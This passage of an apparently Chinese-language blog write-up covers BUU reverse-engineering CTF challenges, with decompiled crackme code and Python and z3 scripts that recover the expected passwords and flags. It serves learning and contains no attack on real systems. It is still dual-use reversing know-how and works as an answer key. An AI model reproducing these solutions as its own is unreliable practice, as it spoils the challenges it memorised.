class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> Buffer[<span class="number">128</span>]; <span class="comment">// [esp+0h] [ebp-94h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *Str1; <span class="comment">// [esp+80h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> *Str2; <span class="comment">// [esp+84h] [ebp-10h]</span></span><br><span class="line">  HANDLE v7; <span class="comment">// [esp+88h] [ebp-Ch]</span></span><br><span class="line">  HANDLE hFile; <span class="comment">// [esp+8Ch] [ebp-8h]</span></span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [esp+90h] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  hFile = GetStdHandle(<span class="number">0xFFFFFFF5</span>);</span><br><span class="line">  v7 = GetStdHandle(<span class="number">0xFFFFFFF6</span>);</span><br><span class="line">  Str2 = <span class="string">&quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&quot;</span>;</span><br><span class="line">  WriteFile(hFile, <span class="string">&quot;Enter password:\r\n&quot;</span>, <span class="number">0x12</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  ReadFile(v7, Buffer, <span class="number">0x80</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  Str1 = sub_401260(Buffer, NumberOfBytesWritten - <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(Str1, Str2) )</span><br><span class="line">    WriteFile(hFile, <span class="string">&quot;Correct!\r\n&quot;</span>, <span class="number">0xB</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    WriteFile(hFile, <span class="string">&quot;Wrong password\r\n&quot;</span>, <span class="number">0x11</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">_BYTE *__cdecl <span class="title">sub_401260</span><span class="params">(<span class="keyword">char</span> *input, DWORD size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+10h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+14h] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// [esp+20h] [ebp-10h]</span></span><br><span class="line">  _BYTE *v8; <span class="comment">// [esp+24h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line">  DWORD v11; <span class="comment">// [esp+2Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v8 = <span class="built_in">malloc</span>(<span class="number">4</span> * ((size + <span class="number">2</span>) / <span class="number">3</span>) + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v8 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v11 &lt; size )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = input[v11];</span><br><span class="line">    <span class="keyword">if</span> ( ++v11 &gt;= size )</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v4 = input[v11++];</span><br><span class="line">    <span class="keyword">if</span> ( v11 &gt;= size )</span><br><span class="line">      v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v3 = input[v11++];</span><br><span class="line">    v7 = v3 + (v5 &lt;&lt; <span class="number">16</span>) + (v4 &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    v8[v9] = aZyxabcdefghijk[(v7 &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v10 = v9 + <span class="number">1</span>;</span><br><span class="line">    v8[v10] = aZyxabcdefghijk[(v7 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v8[++v10] = aZyxabcdefghijk[(v7 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v8[++v10] = aZyxabcdefghijk[v3 &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v9 = v10 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; *&amp;aZyxabcdefghijk[<span class="number">4</span> * (size % <span class="number">3</span>) + <span class="number">64</span>]; ++i )</span><br><span class="line">    v8[<span class="number">4</span> * ((size + <span class="number">2</span>) / <span class="number">3</span>) - i - <span class="number">1</span>] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">  v8[<span class="number">4</span> * ((size + <span class="number">2</span>) / <span class="number">3</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变表的base64：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str1 = <span class="string">&#x27;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&#x27;</span></span><br><span class="line">base = <span class="string">&#x27;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&#x27;</span></span><br><span class="line">table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">a = base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(base, table)))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><h1 id="0x1D-Zer0pts2020-easy-strcmp"><a href="#0x1D-Zer0pts2020-easy-strcmp" class="headerlink" title="0x1D.[Zer0pts2020]easy strcmp"></a>0x1D.[Zer0pts2020]easy strcmp</h1><p>又学到了个小东西，在main之前会先执行init，最后会fini也就是说：</p><p>在执行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a2[<span class="number">1</span>], <span class="string">&quot;zer0pts&#123;********CENSORED********&#125;&quot;</span>) )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;FLAG&gt;\n&quot;</span>, *a2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之前，先执行了init：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v4; <span class="comment">// rbp</span></span><br><span class="line">  __int64 i; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v4 = &amp;off_200DF0 - &amp;funcs_889;</span><br><span class="line">  init_proc();</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i != v4; ++i )</span><br><span class="line">      ((<span class="keyword">void</span> (__fastcall *)(_QWORD, __int64, __int64))*(&amp;funcs_889 + i))(a1, a2, a3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而这里面是执行了两个之间的所有函数：</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211031232427647.png" alt="image-20211031232427647"></p><p>其中重要的就是795的那个函数了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> (**sub_795())(<span class="keyword">const</span> <span class="keyword">char</span> *s1, <span class="keyword">const</span> <span class="keyword">char</span> *s2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> (**result)(<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *); <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = &amp;<span class="built_in">strcmp</span>;</span><br><span class="line">  qword_201090 = (__int64)&amp;<span class="built_in">strcmp</span>;</span><br><span class="line">  off_201028 = sub_6EA;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>吧strcmp的函数换为了sub_6EA，：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6EA</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">    ;</span><br><span class="line">  v4 = (i &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v4; ++j )</span><br><span class="line">    *(_QWORD *)(<span class="number">8</span> * j + a1) -= qword_201060[j];</span><br><span class="line">  <span class="keyword">return</span> qword_201090(a1, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>网上的exp，怎么说呢，中间那块算的还是有问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">enc = <span class="string">&quot;********CENSORED********&quot;</span></span><br><span class="line">m = [<span class="number">0x410A4335494A0942</span>, <span class="number">0x0B0EF2F50BE619F0</span>, <span class="number">0x4F0A3A064A35282B</span>]</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p = enc[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>]</span><br><span class="line">    a = binascii.b2a_hex(p.encode(<span class="string">&#x27;ascii&#x27;</span>)[::-<span class="number">1</span>])</span><br><span class="line">    b = binascii.a2b_hex(<span class="built_in">hex</span>(<span class="built_in">int</span>(a, <span class="number">16</span>) + m[i])[<span class="number">2</span>:])[::-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(a, b, <span class="built_in">hex</span>(m[i]))</span><br><span class="line">    flag += b</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="0x1E-UTCTF2020-basic-re"><a href="#0x1E-UTCTF2020-basic-re" class="headerlink" title="0x1E.[UTCTF2020]basic-re"></a>0x1E.[UTCTF2020]basic-re</h1><p>字符串flag</p><h1 id="0x1F-ACTF新生赛2020-Universe-final-answer"><a href="#0x1F-ACTF新生赛2020-Universe-final-answer" class="headerlink" title="0x1F.[ACTF新生赛2020]Universe_final_answer"></a>0x1F.[ACTF新生赛2020]Universe_final_answer</h1><p>z3的题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> __fastcall <span class="title">sub_860</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// er11</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ebp</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// er10</span></span><br><span class="line">  <span class="keyword">bool</span> result; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1[<span class="number">1</span>];</span><br><span class="line">  v2 = *a1;</span><br><span class="line">  v3 = a1[<span class="number">2</span>];</span><br><span class="line">  v4 = a1[<span class="number">3</span>];</span><br><span class="line">  v5 = a1[<span class="number">4</span>];</span><br><span class="line">  v6 = a1[<span class="number">6</span>];</span><br><span class="line">  v7 = a1[<span class="number">5</span>];</span><br><span class="line">  v8 = a1[<span class="number">7</span>];</span><br><span class="line">  v9 = a1[<span class="number">8</span>];</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">-85</span> * v9 + <span class="number">58</span> * v8 + <span class="number">97</span> * v6 + v7 + <span class="number">-45</span> * v5 + <span class="number">84</span> * v4 + <span class="number">95</span> * v2 - <span class="number">20</span> * v1 + <span class="number">12</span> * v3 == <span class="number">12613</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = a1[<span class="number">9</span>];</span><br><span class="line">    <span class="keyword">if</span> ( <span class="number">30</span> * v11 + <span class="number">-70</span> * v9 + <span class="number">-122</span> * v6 + <span class="number">-81</span> * v7 + <span class="number">-66</span> * v5 + <span class="number">-115</span> * v4 + <span class="number">-41</span> * v3 + <span class="number">-86</span> * v1 - <span class="number">15</span> * v2 - <span class="number">30</span> * v8 == <span class="number">-54400</span></span><br><span class="line">      &amp;&amp; <span class="number">-103</span> * v11 + <span class="number">120</span> * v8 + <span class="number">108</span> * v7 + <span class="number">48</span> * v4 + <span class="number">-89</span> * v3 + <span class="number">78</span> * v1 - <span class="number">41</span> * v2 + <span class="number">31</span> * v5 - (v6 &lt;&lt; <span class="number">6</span>) - <span class="number">120</span> * v9 == <span class="number">-10283</span></span><br><span class="line">      &amp;&amp; <span class="number">71</span> * v6 + (v7 &lt;&lt; <span class="number">7</span>) + <span class="number">99</span> * v5 + <span class="number">-111</span> * v3 + <span class="number">85</span> * v1 + <span class="number">79</span> * v2 - <span class="number">30</span> * v4 - <span class="number">119</span> * v8 + <span class="number">48</span> * v9 - <span class="number">16</span> * v11 == <span class="number">22855</span></span><br><span class="line">      &amp;&amp; <span class="number">5</span> * v11 + <span class="number">23</span> * v9 + <span class="number">122</span> * v8 + <span class="number">-19</span> * v6 + <span class="number">99</span> * v7 + <span class="number">-117</span> * v5 + <span class="number">-69</span> * v3 + <span class="number">22</span> * v1 - <span class="number">98</span> * v2 + <span class="number">10</span> * v4 == <span class="number">-2944</span></span><br><span class="line">      &amp;&amp; <span class="number">-54</span> * v11 + <span class="number">-23</span> * v8 + <span class="number">-82</span> * v3 + <span class="number">-85</span> * v2 + <span class="number">124</span> * v1 - <span class="number">11</span> * v4 - <span class="number">8</span> * v5 - <span class="number">60</span> * v7 + <span class="number">95</span> * v6 + <span class="number">100</span> * v9 == <span class="number">-2222</span></span><br><span class="line">      &amp;&amp; <span class="number">-83</span> * v11 + <span class="number">-111</span> * v7 + <span class="number">-57</span> * v2 + <span class="number">41</span> * v1 + <span class="number">73</span> * v3 - <span class="number">18</span> * v4 + <span class="number">26</span> * v5 + <span class="number">16</span> * v6 + <span class="number">77</span> * v8 - <span class="number">63</span> * v9 == <span class="number">-13258</span></span><br><span class="line">      &amp;&amp; <span class="number">81</span> * v11 + <span class="number">-48</span> * v9 + <span class="number">66</span> * v8 + <span class="number">-104</span> * v6 + <span class="number">-121</span> * v7 + <span class="number">95</span> * v5 + <span class="number">85</span> * v4 + <span class="number">60</span> * v3 + <span class="number">-85</span> * v2 + <span class="number">80</span> * v1 == <span class="number">-1559</span></span><br><span class="line">      &amp;&amp; <span class="number">101</span> * v11 + <span class="number">-85</span> * v9 + <span class="number">7</span> * v6 + <span class="number">117</span> * v7 + <span class="number">-83</span> * v5 + <span class="number">-101</span> * v4 + <span class="number">90</span> * v3 + <span class="number">-28</span> * v1 + <span class="number">18</span> * v2 - v8 == <span class="number">6308</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">99</span> * v11 + <span class="number">-28</span> * v9 + <span class="number">5</span> * v8 + <span class="number">93</span> * v6 + <span class="number">-18</span> * v7 + <span class="number">-127</span> * v5 + <span class="number">6</span> * v4 + <span class="number">-9</span> * v3 + <span class="number">-93</span> * v1 + <span class="number">58</span> * v2 == <span class="number">-1697</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是它的v1和v2，v6和v7要换顺序，拿到输入的东西放入程序就能拿到第二段flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">v1, v2, v3, v4, v5, v6, v7, v8, v9, v11 = BitVecs(</span><br><span class="line">    <span class="string">&#x27;v1 v2 v3 v4 v5 v6 v7 v8 v9 v11&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(v1 &lt; <span class="number">128</span>)</span><br><span class="line">s.add(v2 &lt; <span class="number">128</span>)</span><br><span class="line">s.add(v3 &lt; <span class="number">128</span>)</span><br><span class="line">s.add(v4 &lt; <span class="number">128</span>)</span><br><span class="line">s.add(v5 &lt; <span class="number">128</span>)</span><br><span class="line">s.add(v6 &lt; <span class="number">128</span>)</span><br><span class="line">s.add(v7 &lt; <span class="number">128</span>)</span><br><span class="line">s.add(v8 &lt; <span class="number">128</span>)</span><br><span class="line">s.add(v9 &lt; <span class="number">128</span>)</span><br><span class="line">s.add(v11 &lt; <span class="number">128</span>)</span><br><span class="line">s.add(-<span class="number">85</span> * v9 + <span class="number">58</span> * v8 + <span class="number">97</span> * v6 + v7 + -<span class="number">45</span> * v5 +</span><br><span class="line">      <span class="number">84</span> * v4 + <span class="number">95</span> * v2 - <span class="number">20</span> * v1 + <span class="number">12</span> * v3 == <span class="number">12613</span>)</span><br><span class="line">s.add(<span class="number">30</span> * v11 + -<span class="number">70</span> * v9 + -<span class="number">122</span> * v6 + -<span class="number">81</span> * v7 + -<span class="number">66</span> * v5 + -</span><br><span class="line">      <span class="number">115</span> * v4 + -<span class="number">41</span> * v3 + -<span class="number">86</span> * v1 - <span class="number">15</span> * v2 - <span class="number">30</span> * v8 == -<span class="number">54400</span>)</span><br><span class="line">s.add(-<span class="number">103</span> * v11 + <span class="number">120</span> * v8 + <span class="number">108</span> * v7 + <span class="number">48</span> * v4 + -<span class="number">89</span> * v3 +</span><br><span class="line">      <span class="number">78</span> * v1 - <span class="number">41</span> * v2 + <span class="number">31</span> * v5 - (v6 &lt;&lt; <span class="number">6</span>) - <span class="number">120</span> * v9 == -<span class="number">10283</span>)</span><br><span class="line">s.add(<span class="number">71</span> * v6 + (v7 &lt;&lt; <span class="number">7</span>) + <span class="number">99</span> * v5 + -<span class="number">111</span> * v3 + <span class="number">85</span> * v1 +</span><br><span class="line">      <span class="number">79</span> * v2 - <span class="number">30</span> * v4 - <span class="number">119</span> * v8 + <span class="number">48</span> * v9 - <span class="number">16</span> * v11 == <span class="number">22855</span>)</span><br><span class="line">s.add(<span class="number">5</span> * v11 + <span class="number">23</span> * v9 + <span class="number">122</span> * v8 + -<span class="number">19</span> * v6 + <span class="number">99</span> * v7 + -</span><br><span class="line">      <span class="number">117</span> * v5 + -<span class="number">69</span> * v3 + <span class="number">22</span> * v1 - <span class="number">98</span> * v2 + <span class="number">10</span> * v4 == -<span class="number">2944</span>)</span><br><span class="line">s.add(-<span class="number">54</span> * v11 + -<span class="number">23</span> * v8 + -<span class="number">82</span> * v3 + -<span class="number">85</span> * v2 + <span class="number">124</span> * v1 -</span><br><span class="line">      <span class="number">11</span> * v4 - <span class="number">8</span> * v5 - <span class="number">60</span> * v7 + <span class="number">95</span> * v6 + <span class="number">100</span> * v9 == -<span class="number">2222</span>)</span><br><span class="line">s.add(-<span class="number">83</span> * v11 + -<span class="number">111</span> * v7 + -<span class="number">57</span> * v2 + <span class="number">41</span> * v1 + <span class="number">73</span> * v3 -</span><br><span class="line">      <span class="number">18</span> * v4 + <span class="number">26</span> * v5 + <span class="number">16</span> * v6 + <span class="number">77</span> * v8 - <span class="number">63</span> * v9 == -<span class="number">13258</span>)</span><br><span class="line">s.add(<span class="number">81</span> * v11 + -<span class="number">48</span> * v9 + <span class="number">66</span> * v8 + -<span class="number">104</span> * v6 + -<span class="number">121</span> * v7 +</span><br><span class="line">      <span class="number">95</span> * v5 + <span class="number">85</span> * v4 + <span class="number">60</span> * v3 + -<span class="number">85</span> * v2 + <span class="number">80</span> * v1 == -<span class="number">1559</span>)</span><br><span class="line">s.add(<span class="number">101</span> * v11 + -<span class="number">85</span> * v9 + <span class="number">7</span> * v6 + <span class="number">117</span> * v7 + -<span class="number">83</span> * v5 + -</span><br><span class="line">      <span class="number">101</span> * v4 + <span class="number">90</span> * v3 + -<span class="number">28</span> * v1 + <span class="number">18</span> * v2 - v8 == <span class="number">6308</span>)</span><br><span class="line">s.add(<span class="number">99</span> * v11 + -<span class="number">28</span> * v9 + <span class="number">5</span> * v8 + <span class="number">93</span> * v6 + -<span class="number">18</span> * v7 + -</span><br><span class="line">      <span class="number">127</span> * v5 + <span class="number">6</span> * v4 + -<span class="number">9</span> * v3 + -<span class="number">93</span> * v1 + <span class="number">58</span> * v2 == -<span class="number">1697</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line">v8 = <span class="number">55</span></span><br><span class="line">v1 = <span class="number">48</span></span><br><span class="line">v6 = <span class="number">95</span></span><br><span class="line">v4 = <span class="number">82</span></span><br><span class="line">v2 = <span class="number">70</span></span><br><span class="line">v3 = <span class="number">117</span></span><br><span class="line">v11 = <span class="number">64</span></span><br><span class="line">v5 = <span class="number">84</span></span><br><span class="line">v7 = <span class="number">121</span></span><br><span class="line">v9 = <span class="number">119</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(v2)+<span class="built_in">chr</span>(v1)+<span class="built_in">chr</span>(v3)+<span class="built_in">chr</span>(v4)+<span class="built_in">chr</span>(v5) +</span><br><span class="line">      <span class="built_in">chr</span>(v7)+<span class="built_in">chr</span>(v6)+<span class="built_in">chr</span>(v8)+<span class="built_in">chr</span>(v9)+<span class="built_in">chr</span>(v11))</span><br></pre></td></tr></table></figure><h1 id="0x20-WUSTCTF2020-level4-二叉树"><a href="#0x20-WUSTCTF2020-level4-二叉树" class="headerlink" title="0x20.[WUSTCTF2020]level4(二叉树)"></a>0x20.[WUSTCTF2020]level4(二叉树)</h1><p>64位elf的逆向，先运行下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yutao@ubuntu:~/Desktop$ ./attachment </span><br><span class="line">Practice my Data Structure code.....</span><br><span class="line">Typing....Struct.....char....*left....*right............emmmmm...OK!</span><br><span class="line">Traversal!</span><br><span class="line">Traversal <span class="built_in">type</span> 1:2f0t02T&#123;hcsiI_SwA__r7Ee&#125;</span><br><span class="line">Traversal <span class="built_in">type</span> 2:20f0Th&#123;2tsIS_icArE&#125;e7__w</span><br><span class="line">Traversal <span class="built_in">type</span> 3:    //type3(&amp;x[22]);   No way!</span><br></pre></td></tr></table></figure><p>ida:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 